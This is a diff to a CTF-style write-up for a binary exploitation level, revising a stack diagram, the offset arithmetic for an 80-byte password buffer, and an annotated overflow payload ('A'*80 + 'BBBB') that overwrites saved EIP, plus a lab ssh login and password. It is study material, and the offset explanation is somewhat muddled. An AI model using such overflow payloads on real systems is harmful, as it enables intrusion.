@@ -12,29 +12,47 @@ User input (100 bytes)
               │
               └──► control program execution
 
-# Password buffer
+# Password buffer = 80 bytes
 gdb ./level01
 (gdb) disas main
 
 HIGH ADDRESSES
-┌──────────────────────────────┐
-│ Saved EIP                    │  <-- overwritten by "BBBB"
-└──────────────────────────────┘
-┌──────────────────────────────┐
-│ Saved EBP                    │  <-- overwritten by bytes 80–83
-└──────────────────────────────┘
-┌──────────────────────────────┐
-│ Saved EDI + Saved EBX        │  <-- pushed by 8 bytes
-└──────────────────────────────┘
-┌──────────────────────────────┐
-│ Padding / locals (28 bytes)  │  <-- before buffer
-│ 0x00–0x1B                    │
-└──────────────────────────────┘
-┌──────────────────────────────┐
-│ password buffer (80 bytes)   │  <-- "A"*80
-│ 0x1C–0x6B                    │
-└──────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Saved EIP                                    │  <-- +4 bytes
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Saved EBP                                    │  <-- +4 bytes
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Saved EDI                                    │  <-- +4 bytes
+│ Saved EBX                                    │  <-- +4 bytes
+│ (Pushes = 8 bytes total)                     │
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ Padding / locals (0x00–0x1B)                 │
+│ (Offset from ESP to buffer start = 28 bytes) │  <-- before buffer
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ password buffer (80 bytes)                   │
+│ buf[0]  = esp + 0x1C (BUFFER START)          │  <-- "A"*80
+│ buf[79] = esp + 0x6B (BUFFER END)            │
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ ESP after alignment                          │
+│ and $0xfffffff0, %esp                        │
+│ (Alignment padding = 4 bytes)                │
+└──────────────────────────────────────────────┘
+┌──────────────────────────────────────────────┐
+│ ESP before alignment                         │
+│ (push %ebp; mov %esp,%ebp)                   │
+└──────────────────────────────────────────────┘
 LOW ADDRESSES
+
+- Total stack allocation = `0x60` = 96 bytes
+- Buffer start offset = `0x1c` = 28 bytes
+
+Buffer size (distance from ESP to BUFFER START) = Stack allocation − Offset(from ESP to buffer start) + Pushes + Alignment padding = 96−28+8+4 = 80 bytes
+Not including EIP and EBP into buffer size because the buffer lives inside the 96‑byte local frame and Saved EBP/EIP live outside the local frame
 
 We do not need to manually place EBP, because:
     It is not used after the function returns
@@ -42,11 +60,6 @@ We do not need to manually place EBP, because:
     Only saved EIP determines where the program jumps
 
 So the exploit only needs to set EIP.
-
-- Total stack allocation = `0x60` = 96 bytes
-- Buffer start offset = `0x1c` = 28 bytes
-Buffer size = Stack allocation − Offset(from ESP to buffer start) + Pushes + Alignment padding	​
-96−28+8+4 = 80 bytes
 
 # RET_ADDR = A_USER_NAME + 20
 
@@ -77,7 +90,7 @@ ssh level01@192.168.122.1 -p 4242
 Enter password of level01: 
 uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
 
-python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test01
+python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test01 ("A"*80 → fills buffer, "BBBB" → overwrites EIP)
 
 gdb ./level01
 
@@ -85,7 +98,7 @@ run < /tmp/test01
 info registers
 
 eip            0x42424242
-->OFFSET=80
+->OFFSET=80 (This is the number of bytes we must send to reach saved EIP)
 
 4. Get the address of user_name:
 gdb ./level01
